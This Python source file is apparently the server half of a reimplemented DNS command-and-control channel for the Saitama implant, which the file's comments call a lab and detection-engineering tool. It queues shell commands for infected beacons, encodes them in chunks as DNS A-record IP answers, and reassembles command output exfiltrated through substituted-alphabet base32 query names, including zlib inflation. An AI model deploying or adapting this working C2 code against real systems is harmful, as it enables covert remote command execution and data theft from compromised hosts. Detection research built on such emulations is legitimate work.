import logging
import socket
import zlib
from enum import IntEnum

from saitama.utils.colors import Colors
from saitama.utils.communication import BeaconResponse, BeaconResult, ResultCodes
from saitama.utils.encodings import (
    CHARACTER_SET,
    bruteforce_base32,
    decode_possibly_padded_str_into_int,
    determine_shuffled_alphabet_from_seed,
    encode_int_into_str,
)

logger = logging.getLogger("dns_c2")


# Enums from the implant
class MessageTypes(IntEnum):
    first_alive = 0
    send = 1
    receive = 2
    send_and_receive = 3
    main_alive = 4


class TaskTypes(IntEnum):
    static = 43
    cmd = 70
    compressed_cmd = 71
    file = 95
    compressed_file = 96


# This enum has no equivalent in the implant code itself but is used to keep track at the server-side
class BeaconStates(IntEnum):
    firstalive_done = 0
    payloadsize_sent = 1
    pending_commandresult = 2
    receiving_commandresult = 3
    sleeping = 4


CODE_FOR_ZLIB_DEFLATED_OUTPUT = 61

MESSAGETYPE_FOR_BEACON_STATE = {
    BeaconStates.firstalive_done: None,
    BeaconStates.payloadsize_sent: MessageTypes.receive,
    BeaconStates.pending_commandresult: MessageTypes.send,
    BeaconStates.receiving_commandresult: MessageTypes.send,
}


class SaitamaBeacon:
    def __init__(self, id: str, counter: int):

        # Saitama specific
        self.id = id
        self.counter = counter
        self.alphabet = determine_shuffled_alphabet_from_seed(self.counter, CHARACTER_SET)
        self.command_sent = ""
        self.buffer_size = 0

        # General c2-like variables
        self.command_queue = []
        self.result = b""

        # The server 'assumes' it can keep up with the state of the implant without any errors. While this should
        # suffice for a lab setup, this would not be the way to go for use 'in production' as the implant might crash,
        # might have connection issues, and the like.

        # Upon instantiation of the beacon, the 'server' class has already parsed the firstalive request
        self.state = BeaconStates.firstalive_done

    def log(self, message: str, loglevel=logging.INFO) -> None:
        logger.log(level=loglevel, msg=f"{Colors.CYAN}[BEACON {self.id}] {Colors.RESET}{message}")

    def get_next_command(self, remove_from_queue) -> str:
        if len(self.command_queue) <= 0:
            raise ValueError("Could not fetch the next command because no further commands were scheduled!")
        next_command = self.command_queue[0]
        if remove_from_queue:
            self.command_queue.pop(0)
        return next_command

    def encode_expected_prefix(self) -> str:

        # Determine which message type we are currently expecting
        expected_message_type = MESSAGETYPE_FOR_BEACON_STATE[self.state]
        if expected_message_type is None:
            return encode_int_into_str(self.id, self.alphabet)
        return encode_int_into_str(expected_message_type, self.alphabet) + encode_int_into_str(self.id, self.alphabet)

    def update_counter(self) -> None:
        self.counter += 1
        self.alphabet = determine_shuffled_alphabet_from_seed(self.counter, CHARACTER_SET)

    def process_request(self, data: str) -> BeaconResponse:
        currently_expected_prefix = self.encode_expected_prefix()

        # If the DNS query doesn't start with the prefix we're expecting, this DNS query is not for this beacon
        if not data.startswith(currently_expected_prefix):
            return False

        # Slice the prefix off
        remaining_data = data[len(currently_expected_prefix) :]

        if self.state == BeaconStates.firstalive_done:
            return self.process_payloadsize_request(remaining_data)
        if self.state == BeaconStates.payloadsize_sent:
            return self.process_command_receive_request(remaining_data)
        if self.state == BeaconStates.pending_commandresult:
            return self.process_initial_commandresult_request(remaining_data)
        if self.state == BeaconStates.receiving_commandresult:
            return self.process_continued_commandresult_request(remaining_data)

        raise ValueError(f"Unexpected data stream {data}")

    def process_payloadsize_request(self, data: str) -> BeaconResponse:
        self.log("Request: RECEIVE COMMAND SIZE", loglevel=logging.DEBUG)

        # Find out what our next command is going to be

        # Commands will HAVE to be scheduled in advance. This is of course not preferable in production but
        # then again, this server is meant for lab / detection engineering purposes.
        self.command = self.get_next_command(remove_from_queue=True)

        # Specify payload size.
        # One additional byte to specify the tasktype
        payload_size = len(self.command) + 1

        # First octet can be anything, arbitrary value chosen here. DO NOT fingerprint on this first octet!
        size_as_bytes = b"\xa9" + payload_size.to_bytes(3, "big")
        ip_address = ".".join(map(str, size_as_bytes))

        self.log(f"Response: Sending payload size ({size_as_bytes} bytes --> {ip_address})", loglevel=logging.DEBUG)

        self.state = BeaconStates.payloadsize_sent
        self.update_counter()

        return BeaconResponse(ip_address, None)

    def process_command_receive_request(self, data: str) -> BeaconResponse:
        self.log("Request: RECEIVE COMMAND", loglevel=logging.DEBUG)

        # The command chunk is the 'slice' of the total to-be-sent command that we will be sending on this
        # particular interaction between client and server
        command_chunk_size = 4
        command_chunk_prefix = ""

        if self.command_sent == "":
            # First command you have to dedicate the first octet to the cmd tasktype
            # Only 'cmd' has been implemented here.
            command_chunk_size = 3
            command_chunk_prefix = chr(TaskTypes.cmd)

        # This command 'chunk' should continue where we left off
        lower_bound = len(self.command_sent)

        # We either want to take the next 4 bytes of the command, unless we would then exceed the total command
        # length. If that is the case, that means we're done!
        upper_bound = min([len(self.command), len(self.command_sent) + command_chunk_size])

        command_chunk = self.command[lower_bound:upper_bound]

        # Remember & log what we sent
        self.command_sent += command_chunk
        self.log(f"Response: execute command '{command_chunk}'", loglevel=logging.DEBUG)

        # Prepend the command chunk prefix (which is most of the time nothing, but for the first go
        # contains the command type byte)
        command_chunk = command_chunk_prefix + command_chunk

        # Possibly, the command chunk is now too short (less than 4 characters). Therefore, we right pad it
        # with an arbitrary value (here the representation for the letter 'E'). This value won't affect the
        # client.
        command_chunk = command_chunk.ljust(4, "E")

        # Fill the ip address variable (which we will return) with the command chunk
        ip_address = socket.inet_ntoa(command_chunk.encode())

        # Client will update their counter, so will we
        self.update_counter()

        # If we are done sending, make sure we are ready to receive
        if self.command_sent == self.command:
            self.state = BeaconStates.pending_commandresult

        return BeaconResponse(ip_address, None)

    def process_initial_commandresult_request(self, data: str) -> BeaconResponse:
        # This is the first DNS query that contains the command output
        self.log("Request: SEND (initial)", loglevel=logging.DEBUG)

        # We just received the first packet of the command response!
        self.state = BeaconStates.receiving_commandresult

        # Use the subsitition function to swap the letters using the shared alphabet
        translation_table = data.maketrans(self.alphabet, CHARACTER_SET)
        data = data.translate(translation_table)

        # The first 3 bytes of the remaining data are the byte index, which we don't use.
        # Then, the buffer size follows.
        buffer_size = decode_possibly_padded_str_into_int(data[3:6], CHARACTER_SET)

        # Pop off the byte index + the buffer size
        chunk = data[6:]

        # Pop off the length of the counter from the end of the DNS query
        length_of_my_counter = len(encode_int_into_str(self.counter, self.alphabet))
        chunk = chunk[:-length_of_my_counter]
        chunk = chunk.upper()

        # The remainder is base32 encoded, but due to padding we can't use the normal base32 decoding function
        decoded_chunk = bruteforce_base32(chunk)

        # Process the decoded chunk
        self.result += decoded_chunk
        self.buffer_size = buffer_size

        # The counter will be increased by client, so we will increase our counter as well
        self.update_counter()

        self.log(f"Command result chunk received: {decoded_chunk}", loglevel=logging.DEBUG)

        # We can return an arbitrary IP to the sent queries
        ip_address = "123.111.222.12"
        return BeaconResponse(ip_address, None)

    def process_continued_commandresult_request(self, data: str) -> BeaconResponse:
        self.log("Request: SEND (continued)", loglevel=logging.DEBUG)
        length_of_my_counter = len(encode_int_into_str(self.counter, self.alphabet))

        # Pop off the next 3 bytes, which contain the byte index, which we don't use
        chunk = data[3:]

        # Pop off the length of the counter from the end of the DNS query
        chunk = chunk[:-length_of_my_counter]

        # Use the subsitition function to swap the letters using the shared alphabet
        translation_table = chunk.maketrans(self.alphabet, CHARACTER_SET)
        chunk = chunk.translate(translation_table)

        decoded_chunk = bruteforce_base32(chunk)
        self.result += decoded_chunk

        # The client will update their counter, so will we
        self.update_counter()

        # In verbose mode, update the operator about command output transmission progress
        progress = round((len(self.result) / self.buffer_size) * 100, 2)
        self.log(f"Command result chunk received ({progress}%): {decoded_chunk}", loglevel=logging.DEBUG)

        # Arbitrary value to return
        ip_address = "123.111.222.13"
        if len(self.result) >= self.buffer_size:
            # The command output is done!

            # The first byte indicates whether the command output is zlib deflated or not
            first_byte = self.result[0]
            command_output = self.result[1:]

            if first_byte == CODE_FOR_ZLIB_DEFLATED_OUTPUT:
                # The stream is compressed. We need to prepend the zlib header and then
                # Inflate.

                # https://stackoverflow.com/questions/1089662/python-inflate-and-deflate-implementations
                decompress = zlib.decompressobj(-zlib.MAX_WBITS)
                command_output = decompress.decompress(command_output)
                command_output += decompress.flush()

            # Reset everything
            self.command = ""
            self.command_sent = ""
            self.buffer_size = 0
            self.result = b""
            self.state = BeaconStates.firstalive_done

            # Make sure our server class understands that we have command output for the operator
            response = BeaconResult(ResultCodes.COMMAND_OUTPUT, command_output)
            return BeaconResponse(ip_address, response)

        return BeaconResponse(ip_address, None)
